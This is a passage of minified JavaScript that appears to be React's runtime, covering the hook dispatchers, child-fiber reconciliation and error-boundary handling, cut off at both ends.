Ao(e){var a=Le();return Rn(a,ue,e)}function Rn(e,a,t){var s=e.queue;if(s===null)throw Error(m(311));s.lastRenderedReducer=t;var o=e.baseQueue,n=s.pending;if(n!==null){if(o!==null){var c=o.next;o.next=n.next,n.next=c}a.baseQueue=o=n,s.pending=null}if(n=e.baseState,o===null)e.memoizedState=n;else{a=o.next;var x=c=null,p=null,v=a,C=!1;do{var M=v.lane&-536870913;if(M!==v.lane?(te&M)===M:(mr&M)===M){var y=v.revertLane;if(y===0)p!==null&&(p=p.next={lane:0,revertLane:0,action:v.action,hasEagerState:v.hasEagerState,eagerState:v.eagerState,next:null}),M===yt&&(C=!0);else if((mr&y)===y){v=v.next,y===yt&&(C=!0);continue}else M={lane:0,revertLane:v.revertLane,action:v.action,hasEagerState:v.hasEagerState,eagerState:v.eagerState,next:null},p===null?(x=p=M,c=n):p=p.next=M,W.lanes|=y,gr|=y;M=v.action,Qr&&t(n,M),n=v.hasEagerState?v.eagerState:t(n,M)}else y={lane:M,revertLane:v.revertLane,action:v.action,hasEagerState:v.hasEagerState,eagerState:v.eagerState,next:null},p===null?(x=p=y,c=n):p=p.next=y,W.lanes|=M,gr|=M;v=v.next}while(v!==null&&v!==a);if(p===null?c=n:p.next=x,!la(n,e.memoizedState)&&(ke=!0,C&&(t=St,t!==null)))throw t;e.memoizedState=n,e.baseState=c,e.baseQueue=p,s.lastRenderedState=n}return o===null&&(s.lanes=0),[e.memoizedState,s.dispatch]}function En(e){var a=Le(),t=a.queue;if(t===null)throw Error(m(311));t.lastRenderedReducer=e;var s=t.dispatch,o=t.pending,n=a.memoizedState;if(o!==null){t.pending=null;var c=o=o.next;do n=e(n,c.action),c=c.next;while(c!==o);la(n,a.memoizedState)||(ke=!0),a.memoizedState=n,a.baseQueue===null&&(a.baseState=n),t.lastRenderedState=n}return[n,s]}function vd(e,a,t){var s=W,o=Le(),n=le;if(n){if(t===void 0)throw Error(m(407));t=t()}else t=a();var c=!la((ue||o).memoizedState,t);c&&(o.memoizedState=t,ke=!0),o=o.queue;var x=Sd.bind(null,s,o,e);if(hs(2048,8,x,[e]),o.getSnapshot!==a||c||Ne!==null&&Ne.memoizedState.tag&1){if(s.flags|=2048,Ct(9,Ro(),yd.bind(null,s,o,t,a),null),ve===null)throw Error(m(349));n||(mr&124)!==0||jd(s,a,t)}return t}function jd(e,a,t){e.flags|=16384,e={getSnapshot:a,value:t},a=W.updateQueue,a===null?(a=Sn(),W.updateQueue=a,a.stores=[e]):(t=a.stores,t===null?a.stores=[e]:t.push(e))}function yd(e,a,t,s){a.value=t,a.getSnapshot=s,Ad(a)&&Rd(e)}function Sd(e,a,t){return t(function(){Ad(a)&&Rd(e)})}function Ad(e){var a=e.getSnapshot;e=e.value;try{var t=a();return!la(e,t)}catch{return!0}}function Rd(e){var a=bt(e,2);a!==null&&pa(a,e,2)}function Cn(e){var a=ta();if(typeof e=="function"){var t=e;if(e=t(),Qr){sr(!0);try{t()}finally{sr(!1)}}}return a.memoizedState=a.baseState=e,a.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Ha,lastRenderedState:e},a}function Ed(e,a,t,s){return e.baseState=t,Rn(e,ue,typeof s=="function"?s:Ha)}function yh(e,a,t,s,o){if(Co(e))throw Error(m(485));if(e=a.action,e!==null){var n={payload:o,action:e,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(c){n.listeners.push(c)}};E.T!==null?t(!0):n.isTransition=!1,s(n),t=a.pending,t===null?(n.next=a.pending=n,Cd(a,n)):(n.next=t.next,a.pending=t.next=n)}}function Cd(e,a){var t=a.action,s=a.payload,o=e.state;if(a.isTransition){var n=E.T,c={};E.T=c;try{var x=t(o,s),p=E.S;p!==null&&p(c,x),_d(e,a,x)}catch(v){_n(e,a,v)}finally{E.T=n}}else try{n=t(o,s),_d(e,a,n)}catch(v){_n(e,a,v)}}function _d(e,a,t){t!==null&&typeof t=="object"&&typeof t.then=="function"?t.then(function(s){Md(e,a,s)},function(s){return _n(e,a,s)}):Md(e,a,t)}function Md(e,a,t){a.status="fulfilled",a.value=t,Od(a),e.state=t,a=e.pending,a!==null&&(t=a.next,t===a?e.pending=null:(t=t.next,a.next=t,Cd(e,t)))}function _n(e,a,t){var s=e.pending;if(e.pending=null,s!==null){s=s.next;do a.status="rejected",a.reason=t,Od(a),a=a.next;while(a!==s)}e.action=null}function Od(e){e=e.listeners;for(var a=0;a<e.length;a++)(0,e[a])()}function Dd(e,a){return a}function Td(e,a){if(le){var t=ve.formState;if(t!==null){e:{var s=W;if(le){if(Ce){a:{for(var o=Ce,n=Oa;o.nodeType!==8;){if(!n){o=null;break a}if(o=Ca(o.nextSibling),o===null){o=null;break a}}n=o.data,o=n==="F!"||n==="F"?o:null}if(o){Ce=Ca(o.nextSibling),s=o.data==="F!";break e}}Gr(s)}s=!1}s&&(a=t[0])}}return t=ta(),t.memoizedState=t.baseState=a,s={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Dd,lastRenderedState:a},t.queue=s,t=Kd.bind(null,W,s),s.dispatch=t,s=Cn(!1),n=qn.bind(null,W,!1,s.queue),s=ta(),o={state:a,dispatch:null,action:e,pending:null},s.queue=o,t=yh.bind(null,W,o,n,t),o.dispatch=t,s.memoizedState=e,[a,t,!1]}function qd(e){var a=Le();return Nd(a,ue,e)}function Nd(e,a,t){if(a=Rn(e,a,Dd)[0],e=Ao(Ha)[0],typeof a=="object"&&a!==null&&typeof a.then=="function")try{var s=ps(a)}catch(c){throw c===ls?bo:c}else s=a;a=Le();var o=a.queue,n=o.dispatch;return t!==a.memoizedState&&(W.flags|=2048,Ct(9,Ro(),Sh.bind(null,o,t),null)),[s,n,e]}function Sh(e,a){e.action=a}function Ld(e){var a=Le(),t=ue;if(t!==null)return Nd(a,t,e);Le(),a=a.memoizedState,t=Le();var s=t.queue.dispatch;return t.memoizedState=e,[a,s,!1]}function Ct(e,a,t,s){return e={tag:e,create:t,deps:s,inst:a,next:null},a=W.updateQueue,a===null&&(a=Sn(),W.updateQueue=a),t=a.lastEffect,t===null?a.lastEffect=e.next=e:(s=t.next,t.next=e,e.next=s,a.lastEffect=e),e}function Ro(){return{destroy:void 0,resource:void 0}}function zd(){return Le().memoizedState}function Eo(e,a,t,s){var o=ta();s=s===void 0?null:s,W.flags|=e,o.memoizedState=Ct(1|a,Ro(),t,s)}function hs(e,a,t,s){var o=Le();s=s===void 0?null:s;var n=o.memoizedState.inst;ue!==null&&s!==null&&bn(s,ue.memoizedState.deps)?o.memoizedState=Ct(a,n,t,s):(W.flags|=e,o.memoizedState=Ct(1|a,n,t,s))}function wd(e,a){Eo(8390656,8,e,a)}function Xd(e,a){hs(2048,8,e,a)}function Bd(e,a){return hs(4,2,e,a)}function Pd(e,a){return hs(4,4,e,a)}function Ud(e,a){if(typeof a=="function"){e=e();var t=a(e);return function(){typeof t=="function"?t():a(null)}}if(a!=null)return e=e(),a.current=e,function(){a.current=null}}function Id(e,a,t){t=t!=null?t.concat([e]):null,hs(4,4,Ud.bind(null,a,e),t)}function Mn(){}function kd(e,a){var t=Le();a=a===void 0?null:a;var s=t.memoizedState;return a!==null&&bn(a,s[1])?s[0]:(t.memoizedState=[e,a],e)}function Fd(e,a){var t=Le();a=a===void 0?null:a;var s=t.memoizedState;if(a!==null&&bn(a,s[1]))return s[0];if(s=e(),Qr){sr(!0);try{e()}finally{sr(!1)}}return t.memoizedState=[s,a],s}function On(e,a,t){return t===void 0||(mr&1073741824)!==0?e.memoizedState=a:(e.memoizedState=t,e=Hm(),W.lanes|=e,gr|=e,t)}function Gd(e,a,t,s){return la(t,a)?t:At.current!==null?(e=On(e,t,s),la(e,a)||(ke=!0),e):(mr&42)===0?(ke=!0,e.memoizedState=t):(e=Hm(),W.lanes|=e,gr|=e,a)}function Vd(e,a,t,s,o){var n=N.p;N.p=n!==0&&8>n?n:8;var c=E.T,x={};E.T=x,qn(e,!1,a,t);try{var p=o(),v=E.S;if(v!==null&&v(x,p),p!==null&&typeof p=="object"&&typeof p.then=="function"){var C=gh(p,s);fs(e,a,C,xa(e))}else fs(e,a,s,xa(e))}catch(M){fs(e,a,{then:function(){},status:"rejected",reason:M},xa())}finally{N.p=n,E.T=c}}function Ah(){}function Dn(e,a,t,s){if(e.tag!==5)throw Error(m(476));var o=Hd(e).queue;Vd(e,o,a,H,t===null?Ah:function(){return Zd(e),t(s)})}function Hd(e){var a=e.memoizedState;if(a!==null)return a;a={memoizedState:H,baseState:H,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Ha,lastRenderedState:H},next:null};var t={};return a.next={memoizedState:t,baseState:t,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Ha,lastRenderedState:t},next:null},e.memoizedState=a,e=e.alternate,e!==null&&(e.memoizedState=a),a}function Zd(e){var a=Hd(e).next.queue;fs(e,a,{},xa())}function Tn(){return We(Ls)}function Qd(){return Le().memoizedState}function Yd(){return Le().memoizedState}function Rh(e){for(var a=e.return;a!==null;){switch(a.tag){case 24:case 3:var t=xa();e=cr(t);var s=dr(a,e,t);s!==null&&(pa(s,a,t),ds(s,a,t)),a={cache:nn()},e.payload=a;return}a=a.return}}function Eh(e,a,t){var s=xa();t={lane:s,revertLane:0,action:t,hasEagerState:!1,eagerState:null,next:null},Co(e)?Wd(a,t):(t=Ki(e,a,t,s),t!==null&&(pa(t,e,s),Jd(t,a,s)))}function Kd(e,a,t){var s=xa();fs(e,a,t,s)}function fs(e,a,t,s){var o={lane:s,revertLane:0,action:t,hasEagerState:!1,eagerState:null,next:null};if(Co(e))Wd(a,o);else{var n=e.alternate;if(e.lanes===0&&(n===null||n.lanes===0)&&(n=a.lastRenderedReducer,n!==null))try{var c=a.lastRenderedState,x=n(c,t);if(o.hasEagerState=!0,o.eagerState=x,la(x,c))return lo(e,a,o,0),ve===null&&no(),!1}catch{}if(t=Ki(e,a,o,s),t!==null)return pa(t,e,s),Jd(t,a,s),!0}return!1}function qn(e,a,t,s){if(s={lane:2,revertLane:dl(),action:s,hasEagerState:!1,eagerState:null,next:null},Co(e)){if(a)throw Error(m(479))}else a=Ki(e,t,s,2),a!==null&&pa(a,e,2)}function Co(e){var a=e.alternate;return e===W||a!==null&&a===W}function Wd(e,a){Rt=jo=!0;var t=e.pending;t===null?a.next=a:(a.next=t.next,t.next=a),e.pending=a}function Jd(e,a,t){if((t&4194048)!==0){var s=a.lanes;s&=e.pendingLanes,t|=s,a.lanes=t,ic(e,t)}}var _o={readContext:We,use:So,useCallback:Oe,useContext:Oe,useEffect:Oe,useImperativeHandle:Oe,useLayoutEffect:Oe,useInsertionEffect:Oe,useMemo:Oe,useReducer:Oe,useRef:Oe,useState:Oe,useDebugValue:Oe,useDeferredValue:Oe,useTransition:Oe,useSyncExternalStore:Oe,useId:Oe,useHostTransitionStatus:Oe,useFormState:Oe,useActionState:Oe,useOptimistic:Oe,useMemoCache:Oe,useCacheRefresh:Oe},$d={readContext:We,use:So,useCallback:function(e,a){return ta().memoizedState=[e,a===void 0?null:a],e},useContext:We,useEffect:wd,useImperativeHandle:function(e,a,t){t=t!=null?t.concat([e]):null,Eo(4194308,4,Ud.bind(null,a,e),t)},useLayoutEffect:function(e,a){return Eo(4194308,4,e,a)},useInsertionEffect:function(e,a){Eo(4,2,e,a)},useMemo:function(e,a){var t=ta();a=a===void 0?null:a;var s=e();if(Qr){sr(!0);try{e()}finally{sr(!1)}}return t.memoizedState=[s,a],s},useReducer:function(e,a,t){var s=ta();if(t!==void 0){var o=t(a);if(Qr){sr(!0);try{t(a)}finally{sr(!1)}}}else o=a;return s.memoizedState=s.baseState=o,e={pending:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:o},s.queue=e,e=e.dispatch=Eh.bind(null,W,e),[s.memoizedState,e]},useRef:function(e){var a=ta();return e={current:e},a.memoizedState=e},useState:function(e){e=Cn(e);var a=e.queue,t=Kd.bind(null,W,a);return a.dispatch=t,[e.memoizedState,t]},useDebugValue:Mn,useDeferredValue:function(e,a){var t=ta();return On(t,e,a)},useTransition:function(){var e=Cn(!1);return e=Vd.bind(null,W,e.queue,!0,!1),ta().memoizedState=e,[!1,e]},useSyncExternalStore:function(e,a,t){var s=W,o=ta();if(le){if(t===void 0)throw Error(m(407));t=t()}else{if(t=a(),ve===null)throw Error(m(349));(te&124)!==0||jd(s,a,t)}o.memoizedState=t;var n={value:t,getSnapshot:a};return o.queue=n,wd(Sd.bind(null,s,n,e),[e]),s.flags|=2048,Ct(9,Ro(),yd.bind(null,s,n,t,a),null),t},useId:function(){var e=ta(),a=ve.identifierPrefix;if(le){var t=Fa,s=ka;t=(s&~(1<<32-na(s)-1)).toString(32)+t,a="«"+a+"R"+t,t=yo++,0<t&&(a+="H"+t.toString(32)),a+="»"}else t=vh++,a="«"+a+"r"+t.toString(32)+"»";return e.memoizedState=a},useHostTransitionStatus:Tn,useFormState:Td,useActionState:Td,useOptimistic:function(e){var a=ta();a.memoizedState=a.baseState=e;var t={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return a.queue=t,a=qn.bind(null,W,!0,t),t.dispatch=a,[e,a]},useMemoCache:An,useCacheRefresh:function(){return ta().memoizedState=Rh.bind(null,W)}},em={readContext:We,use:So,useCallback:kd,useContext:We,useEffect:Xd,useImperativeHandle:Id,useInsertionEffect:Bd,useLayoutEffect:Pd,useMemo:Fd,useReducer:Ao,useRef:zd,useState:function(){return Ao(Ha)},useDebugValue:Mn,useDeferredValue:function(e,a){var t=Le();return Gd(t,ue.memoizedState,e,a)},useTransition:function(){var e=Ao(Ha)[0],a=Le().memoizedState;return[typeof e=="boolean"?e:ps(e),a]},useSyncExternalStore:vd,useId:Qd,useHostTransitionStatus:Tn,useFormState:qd,useActionState:qd,useOptimistic:function(e,a){var t=Le();return Ed(t,ue,e,a)},useMemoCache:An,useCacheRefresh:Yd},Ch={readContext:We,use:So,useCallback:kd,useContext:We,useEffect:Xd,useImperativeHandle:Id,useInsertionEffect:Bd,useLayoutEffect:Pd,useMemo:Fd,useReducer:En,useRef:zd,useState:function(){return En(Ha)},useDebugValue:Mn,useDeferredValue:function(e,a){var t=Le();return ue===null?On(t,e,a):Gd(t,ue.memoizedState,e,a)},useTransition:function(){var e=En(Ha)[0],a=Le().memoizedState;return[typeof e=="boolean"?e:ps(e),a]},useSyncExternalStore:vd,useId:Qd,useHostTransitionStatus:Tn,useFormState:Ld,useActionState:Ld,useOptimistic:function(e,a){var t=Le();return ue!==null?Ed(t,ue,e,a):(t.baseState=e,[e,t.queue.dispatch])},useMemoCache:An,useCacheRefresh:Yd},_t=null,bs=0;function Mo(e){var a=bs;return bs+=1,_t===null&&(_t=[]),md(_t,e,a)}function gs(e,a){a=a.props.ref,e.ref=a!==void 0?a:null}function Oo(e,a){throw a.$$typeof===k?Error(m(525)):(e=Object.prototype.toString.call(a),Error(m(31,e==="[object Object]"?"object with keys {"+Object.keys(a).join(", ")+"}":e)))}function am(e){var a=e._init;return a(e._payload)}function rm(e){function a(b,h){if(e){var g=b.deletions;g===null?(b.deletions=[h],b.flags|=16):g.push(h)}}function t(b,h){if(!e)return null;for(;h!==null;)a(b,h),h=h.sibling;return null}function s(b){for(var h=new Map;b!==null;)b.key!==null?h.set(b.key,b):h.set(b.index,b),b=b.sibling;return h}function o(b,h){return b=Ia(b,h),b.index=0,b.sibling=null,b}function n(b,h,g){return b.index=g,e?(g=b.alternate,g!==null?(g=g.index,g<h?(b.flags|=67108866,h):g):(b.flags|=67108866,h)):(b.flags|=1048576,h)}function c(b){return e&&b.alternate===null&&(b.flags|=67108866),b}function x(b,h,g,_){return h===null||h.tag!==6?(h=Ji(g,b.mode,_),h.return=b,h):(h=o(h,g),h.return=b,h)}function p(b,h,g,_){var X=g.type;return X===Y?C(b,h,g.props.children,_,g.key):h!==null&&(h.elementType===X||typeof X=="object"&&X!==null&&X.$$typeof===I&&am(X)===h.type)?(h=o(h,g.props),gs(h,g),h.return=b,h):(h=mo(g.type,g.key,g.props,null,b.mode,_),gs(h,g),h.return=b,h)}function v(b,h,g,_){return h===null||h.tag!==4||h.stateNode.containerInfo!==g.containerInfo||h.stateNode.implementation!==g.implementation?(h=$i(g,b.mode,_),h.return=b,h):(h=o(h,g.children||[]),h.return=b,h)}function C(b,h,g,_,X){return h===null||h.tag!==7?(h=Ur(g,b.mode,_,X),h.return=b,h):(h=o(h,g),h.return=b,h)}function M(b,h,g){if(typeof h=="string"&&h!==""||typeof h=="number"||typeof h=="bigint")return h=Ji(""+h,b.mode,g),h.return=b,h;if(typeof h=="object"&&h!==null){switch(h.$$typeof){case U:return g=mo(h.type,h.key,h.props,null,b.mode,g),gs(g,h),g.return=b,g;case $:return h=$i(h,b.mode,g),h.return=b,h;case I:var _=h._init;return h=_(h._payload),M(b,h,g)}if(Ye(h)||Ve(h))return h=Ur(h,b.mode,g,null),h.return=b,h;if(typeof h.then=="function")return M(b,Mo(h),g);if(h.$$typeof===ye)return M(b,ho(b,h),g);Oo(b,h)}return null}function y(b,h,g,_){var X=h!==null?h.key:null;if(typeof g=="string"&&g!==""||typeof g=="number"||typeof g=="bigint")return X!==null?null:x(b,h,""+g,_);if(typeof g=="object"&&g!==null){switch(g.$$typeof){case U:return g.key===X?p(b,h,g,_):null;case $:return g.key===X?v(b,h,g,_):null;case I:return X=g._init,g=X(g._payload),y(b,h,g,_)}if(Ye(g)||Ve(g))return X!==null?null:C(b,h,g,_,null);if(typeof g.then=="function")return y(b,h,Mo(g),_);if(g.$$typeof===ye)return y(b,h,ho(b,g),_);Oo(b,g)}return null}function S(b,h,g,_,X){if(typeof _=="string"&&_!==""||typeof _=="number"||typeof _=="bigint")return b=b.get(g)||null,x(h,b,""+_,X);if(typeof _=="object"&&_!==null){switch(_.$$typeof){case U:return b=b.get(_.key===null?g:_.key)||null,p(h,b,_,X);case $:return b=b.get(_.key===null?g:_.key)||null,v(h,b,_,X);case I:var ee=_._init;return _=ee(_._payload),S(b,h,g,_,X)}if(Ye(_)||Ve(_))return b=b.get(g)||null,C(h,b,_,X,null);if(typeof _.then=="function")return S(b,h,g,Mo(_),X);if(_.$$typeof===ye)return S(b,h,g,ho(h,_),X);Oo(h,_)}return null}function Q(b,h,g,_){for(var X=null,ee=null,F=h,Z=h=0,Ge=null;F!==null&&Z<g.length;Z++){F.index>Z?(Ge=F,F=null):Ge=F.sibling;var ie=y(b,F,g[Z],_);if(ie===null){F===null&&(F=Ge);break}e&&F&&ie.alternate===null&&a(b,F),h=n(ie,h,Z),ee===null?X=ie:ee.sibling=ie,ee=ie,F=Ge}if(Z===g.length)return t(b,F),le&&kr(b,Z),X;if(F===null){for(;Z<g.length;Z++)F=M(b,g[Z],_),F!==null&&(h=n(F,h,Z),ee===null?X=F:ee.sibling=F,ee=F);return le&&kr(b,Z),X}for(F=s(F);Z<g.length;Z++)Ge=S(F,b,Z,g[Z],_),Ge!==null&&(e&&Ge.alternate!==null&&F.delete(Ge.key===null?Z:Ge.key),h=n(Ge,h,Z),ee===null?X=Ge:ee.sibling=Ge,ee=Ge);return e&&F.forEach(function(_r){return a(b,_r)}),le&&kr(b,Z),X}function V(b,h,g,_){if(g==null)throw Error(m(151));for(var X=null,ee=null,F=h,Z=h=0,Ge=null,ie=g.next();F!==null&&!ie.done;Z++,ie=g.next()){F.index>Z?(Ge=F,F=null):Ge=F.sibling;var _r=y(b,F,ie.value,_);if(_r===null){F===null&&(F=Ge);break}e&&F&&_r.alternate===null&&a(b,F),h=n(_r,h,Z),ee===null?X=_r:ee.sibling=_r,ee=_r,F=Ge}if(ie.done)return t(b,F),le&&kr(b,Z),X;if(F===null){for(;!ie.done;Z++,ie=g.next())ie=M(b,ie.value,_),ie!==null&&(h=n(ie,h,Z),ee===null?X=ie:ee.sibling=ie,ee=ie);return le&&kr(b,Z),X}for(F=s(F);!ie.done;Z++,ie=g.next())ie=S(F,b,Z,ie.value,_),ie!==null&&(e&&ie.alternate!==null&&F.delete(ie.key===null?Z:ie.key),h=n(ie,h,Z),ee===null?X=ie:ee.sibling=ie,ee=ie);return e&&F.forEach(function(Mf){return a(b,Mf)}),le&&kr(b,Z),X}function pe(b,h,g,_){if(typeof g=="object"&&g!==null&&g.type===Y&&g.key===null&&(g=g.props.children),typeof g=="object"&&g!==null){switch(g.$$typeof){case U:e:{for(var X=g.key;h!==null;){if(h.key===X){if(X=g.type,X===Y){if(h.tag===7){t(b,h.sibling),_=o(h,g.props.children),_.return=b,b=_;break e}}else if(h.elementType===X||typeof X=="object"&&X!==null&&X.$$typeof===I&&am(X)===h.type){t(b,h.sibling),_=o(h,g.props),gs(_,g),_.return=b,b=_;break e}t(b,h);break}else a(b,h);h=h.sibling}g.type===Y?(_=Ur(g.props.children,b.mode,_,g.key),_.return=b,b=_):(_=mo(g.type,g.key,g.props,null,b.mode,_),gs(_,g),_.return=b,b=_)}return c(b);case $:e:{for(X=g.key;h!==null;){if(h.key===X)if(h.tag===4&&h.stateNode.containerInfo===g.containerInfo&&h.stateNode.implementation===g.implementation){t(b,h.sibling),_=o(h,g.children||[]),_.return=b,b=_;break e}else{t(b,h);break}else a(b,h);h=h.sibling}_=$i(g,b.mode,_),_.return=b,b=_}return c(b);case I:return X=g._init,g=X(g._payload),pe(b,h,g,_)}if(Ye(g))return Q(b,h,g,_);if(Ve(g)){if(X=Ve(g),typeof X!="function")throw Error(m(150));return g=X.call(g),V(b,h,g,_)}if(typeof g.then=="function")return pe(b,h,Mo(g),_);if(g.$$typeof===ye)return pe(b,h,ho(b,g),_);Oo(b,g)}return typeof g=="string"&&g!==""||typeof g=="number"||typeof g=="bigint"?(g=""+g,h!==null&&h.tag===6?(t(b,h.sibling),_=o(h,g),_.return=b,b=_):(t(b,h),_=Ji(g,b.mode,_),_.return=b,b=_),c(b)):t(b,h)}return function(b,h,g,_){try{bs=0;var X=pe(b,h,g,_);return _t=null,X}catch(F){if(F===ls||F===bo)throw F;var ee=ca(29,F,null,b.mode);return ee.lanes=_,ee.return=b,ee}}}var Mt=rm(!0),tm=rm(!1),ya=Ue(null),Da=null;function ur(e){var a=e.alternate;ne(Xe,Xe.current&1),ne(ya,e),Da===null&&(a===null||At.current!==null||a.memoizedState!==null)&&(Da=e)}function sm(e){if(e.tag===22){if(ne(Xe,Xe.current),ne(ya,e),Da===null){var a=e.alternate;a!==null&&a.memoizedState!==null&&(Da=e)}}else xr()}function xr(){ne(Xe,Xe.current),ne(ya,ya.current)}function Za(e){be(ya),Da===e&&(Da=null),be(Xe)}var Xe=Ue(0);function Do(e){for(var a=e;a!==null;){if(a.tag===13){var t=a.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||Sl(t)))return a}else if(a.tag===19&&a.memoizedProps.revealOrder!==void 0){if((a.flags&128)!==0)return a}else if(a.child!==null){a.child.return=a,a=a.child;continue}if(a===e)break;for(;a.sibling===null;){if(a.return===null||a.return===e)return null;a=a.return}a.sibling.return=a.return,a=a.sibling}return null}function Nn(e,a,t,s){a=e.memoizedState,t=t(s,a),t=t==null?a:D({},a,t),e.memoizedState=t,e.lanes===0&&(e.updateQueue.baseState=t)}var Ln={enqueueSetState:function(e,a,t){e=e._reactInternals;var s=xa(),o=cr(s);o.payload=a,t!=null&&(o.callback=t),a=dr(e,o,s),a!==null&&(pa(a,e,s),ds(a,e,s))},enqueueReplaceState:function(e,a,t){e=e._reactInternals;var s=xa(),o=cr(s);o.tag=1,o.payload=a,t!=null&&(o.callback=t),a=dr(e,o,s),a!==null&&(pa(a,e,s),ds(a,e,s))},enqueueForceUpdate:function(e,a){e=e._reactInternals;var t=xa(),s=cr(t);s.tag=2,a!=null&&(s.callback=a),a=dr(e,s,t),a!==null&&(pa(a,e,t),ds(a,e,t))}};function om(e,a,t,s,o,n,c){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(s,n,c):a.prototype&&a.prototype.isPureReactComponent?!es(t,s)||!es(o,n):!0}function im(e,a,t,s){e=a.state,typeof a.componentWillReceiveProps=="function"&&a.componentWillReceiveProps(t,s),typeof a.UNSAFE_componentWillReceiveProps=="function"&&a.UNSAFE_componentWillReceiveProps(t,s),a.state!==e&&Ln.enqueueReplaceState(a,a.state,null)}function Yr(e,a){var t=a;if("ref"in a){t={};for(var s in a)s!=="ref"&&(t[s]=a[s])}if(e=e.defaultProps){t===a&&(t=D({},t));for(var o in e)t[o]===void 0&&(t[o]=e[o])}return t}var To=typeof reportError=="function"?reportError:function(e){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var a=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof e=="object"&&e!==null&&typeof e.message=="string"?String(e.message):String(e),error:e});if(!window.dispatchEvent(a))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",e);return}console.error(e)};function nm(e){To(e)}function lm(e){console.error(e)}function cm(e){To(e)}function qo(e,a){try{var t=e.onUncaughtError;t(a.value,{componentStack:a.stack})}catch(s){setTimeout(function(){throw s})}}function dm(e,a,t){try{var s=e.onCaughtError;s(t.value,{componentStack:t.stack,errorBoundary:a.tag===1?a.stateNode:null})}catch(o){setTimeout(function(){throw o})}}function zn(e,a,t){return t=cr(t),t.tag=3,t.payload={element:null},t.callback=function(){qo(e,a)},t}function mm(e){return e=cr(e),e.tag=3,e}function um(e,a,t,s){var o=t.type.getDerivedStateFromError;if(typeof o=="function"){var n=s.value;e.payload=function(){return o(n)},e.callback=function(){dm(a,t,s)}}var c=t.stateNode;c!==null&&typeof c.componentDidCatch=="function"&&(e.callback=function(){dm(a,t,s),typeof o!="function"&&(vr===null?vr=new Set([this]):vr.add(this));var x=s.stack;this.componentDidCatch(s.value,{componentStack:x!==null?x:""})})}function _h(e,a,t,s,o){if(t.flags|=32768,s!==null&&typeof s=="object"&&typeof s.then=="function"){if(a=t.alternate,a!==null&&os(a,t,o,!0),t=ya.current,t!==null){switch(t.tag){case 13:return Da===null?ol():t.alternate===null&&_e===0&&(_e=3),t.flags&=-257,t.flags|=65536,t.lanes=o,s===dn?t.flags|=16384:(a=t.updateQueue,a===null?t.updateQueue=new Set([s]):a.add(s),nl(e,s,o)),!1;case 22:return t.flags|=65536,s===dn?t.flags|=16384:(a=t.updateQueue,a===null?(a={transitions:null,markerInstances:null,retryQueue:new Set([s])},t.updateQueue=a):(t=a.retryQueue,t===null?a.retryQueue=new Set([s]):t.add(s)),nl(e,s,o)),!1}throw Error(m(435,t.tag))}return nl(e,s,o),ol(),!1}if(le)return a=ya.current,a!==null?((a.flags&65536)===0&&(a.flags|=256),a.flags|=65536,a.lanes=o,s!==rn&&(e=Error(m(422),{cause:s}),ss(ba(e,t)))):(s!==rn&&(a=Error(m(423),{cause:s}),ss(ba(a,t))),e=e.current.alternate,e.flags|=65536,o&=-o,e.lanes|=o,s=ba(s,t),o=zn(e.stateNode,s,o),xn(e,o),_e!==4&&(_e=2)),!1;var n=Error(m(520),{cause:s});if(n=ba(n,t),Es===null?Es=[n]:Es.push(n),_e!==4&&(_e=2),a===null)return!0;s=ba(s,t),t=a;do{switch(t.tag){case 3:return t.flags|=65536,e=o&-o,t.lanes|=e,e=zn(t.stateNode,s,e),xn(t,e),!1;case 1:if(a=t.type,n=t.stateNode,(t.flags&128)===0&&(typeof a.getDerivedStateFromError=="function"||n!==null&&typeof n.componentDidCatch=="function"&&(vr===null||!vr.has(n))))return t.flags|=65536,o&=-o,t.lanes|=o,o=mm(o),um(o,e,t,s),xn(t,o),!1}t=t.return}while(t!==null);return!1}var xm=Error(m(461)),ke=!1;function He(e,a,t,s){a.child=e===null?tm(a,null,t,s):Mt(a,e.child,t,s)}function pm(e,a,t,s,o){t=t.render;var n=a.ref;if("ref"in s){var c={};for(var x in s)x!=="ref"&&(c[x]=s[x])}else c=s;return Hr(a),s=gn(e,a,t,c,n,o),x=vn(),e!==null&&!ke?(jn(e,a,o),Qa(e,a,o)):(le&&x&&en(a),a.flags|=1,He(e,a,s,o),a.child)}function hm(e,a,t,s,o){if(e===null){var n=t.type;return typeof n=="function"&&!Wi(n)&&n.defaultProps===void 0&&t.compare===null?(a.tag=15,a.type=n,fm(e,a,n,s,o)):(e=mo(t.type,null,s,a,a.mode,o),e.ref=a.ref,e.return=a,a.child=e)}if(n=e.child,!Fn(e,o)){var c=n.memoizedProps;if(t=t.compare,t=t!==null?t:es,t(c,s)&&e.ref===a.ref)return Qa(e,a,o)}return a.flags|=1,e=Ia(n,s),e.ref=a.ref,e.return=a,a.child=e}function fm(e,a,t,s,o){if(e!==null){var n=e.memoizedProps;if(es(n,s)&&e.ref===a.ref)if(ke=!1,a.pendingProps=s=n,Fn(e,o))(e.flags&131072)!==0&&(ke=!0);else return a.lanes=e.lanes,Qa(e,a,o)}return wn(e,a,t,s,o)}function bm(e,a,t){var s=a.pendingProps,o=s.children,n=e!==null?e.memoizedState:null;if(s.mode==="hidden"){if((a.flags&128)!==0){if(s=n!==null?n.baseLanes|t:t,e!==null){for(o=a.child=e.child,n=0;o!==null;)n=n|o.lanes|o.childLanes,o=o.sibling;a.childLanes=n&~s}else a.childLanes=0,a.child=null;return gm(e,a,s,t)}if((t&536870912)!==0)a.memoizedState={baseLanes:0,cachePool:null},e!==null&&fo(a,n!==null?n.cachePool:null),n!==null?fd(a,n):hn(),sm(a);else return a.lanes=a.childLanes=536870912,gm(e,a,n!==null?n.baseLanes|t:t,t)}else n!==null?(fo(a,n.cachePool),fd(a,n),xr(),a.memoizedState=null):(e!==null&&fo(a,null),hn(),xr());return He(e,a,o,t),a.child}function gm(e,a,t,s){var o=cn();return 